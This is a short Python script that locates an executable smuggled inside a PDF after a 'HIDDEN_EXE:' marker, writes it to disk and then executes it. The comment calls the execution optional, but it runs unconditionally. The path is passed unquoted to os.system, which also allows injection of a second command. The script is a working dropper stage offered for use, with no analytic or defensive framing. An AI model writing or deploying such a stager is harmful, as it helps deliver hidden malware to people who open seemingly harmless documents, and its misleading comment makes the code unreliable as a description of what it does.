import os

def extract_exe(pdf_path, output_exe_path, marker="HIDDEN_EXE:"):
    if not os.path.exists(pdf_path):
        print(f"Error: PDF not found at {pdf_path}")
        return
    with open(pdf_path, "rb") as f:
        data = f.read()
    marker_bytes = marker.encode()
    marker_index = data.find(marker_bytes)
    if marker_index == -1:
        print(f"Error: Marker '{marker}' not found in PDF")
        return
    exe_data = data[marker_index + len(marker_bytes) + 1:]
    with open(output_exe_path, "wb") as f:
        f.write(exe_data)
    print(f"Success: .exe extracted to {output_exe_path}")
    # Optionally run the .exe
    os.system(output_exe_path)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Extract .exe from PDF")
    parser.add_argument("pdf_path", help="Path to the PDF with hidden .exe")
    parser.add_argument("output_exe_path", help="Path to save the extracted .exe")
    args = parser.parse_args()
    extract_exe(args.pdf_path, args.output_exe_path)
